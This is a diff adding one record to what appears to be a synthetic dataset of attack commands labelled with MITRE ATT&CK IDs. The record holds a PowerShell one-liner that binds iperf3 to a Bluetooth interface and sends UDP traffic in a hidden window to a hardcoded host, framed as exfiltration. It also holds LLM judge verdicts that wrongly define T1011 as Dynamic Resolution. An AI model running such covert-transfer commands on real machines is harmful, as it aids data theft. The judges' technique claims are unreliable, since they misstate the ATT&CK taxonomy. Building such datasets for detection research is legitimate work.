@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 172.31.199.2 -p 55222 -B $lip -u -t 40\"",
+  "explanation": "Binds iperf3 to the Bluetooth PAN interface and exfiltrates over an uncommon UDP port, leveraging Bluetooth as an alternate medium per T1011.",
+  "rationale_steps": [
+    "Identify the Bluetooth PAN interface.",
+    "Retrieve the IPv4 address assigned to the Bluetooth interface.",
+    "Launch iperf3 bound to that interface using a high, uncommon UDP port.",
+    "Run the transfer in a hidden window to reduce casual observation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-1a31ae00",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, error handling, pipeline usage, balanced parentheses, and correct parameter syntax for all cmdlets.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration over an uncommon UDP port using Bluetooth as an alternate medium, it doesn't align with T1011 (Dynamic Resolution) which involves algorithmically determining network endpoints, not using alternate communication channels.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:43:02.752284Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with correct syntax for cmdlet usage, variable assignment, property access, and argument passing to an external executable.",
+        "semantic_score": 2,
+        "semantic_justification": "The command successfully binds iperf3 to the Bluetooth interface for exfiltration over an uncommon UDP port, which is operationally plausible, but it fundamentally fails to demonstrate T1011's core aspect of 'Dynamic Resolution' as the destination IP address is statically hardcoded.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:43:13.299852Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, valid cmdlets/flags, proper separators, and a correctly composed Start-Process argument string.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly binds iperf3 to a Bluetooth PAN and sends UDP traffic, it uses a fixed IP/port with no DNS/DGA/endpoint rotation and iperf3 is not performing data exfiltration, so it does not implement the described Dynamic Resolution behavior.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:43:41.383885Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
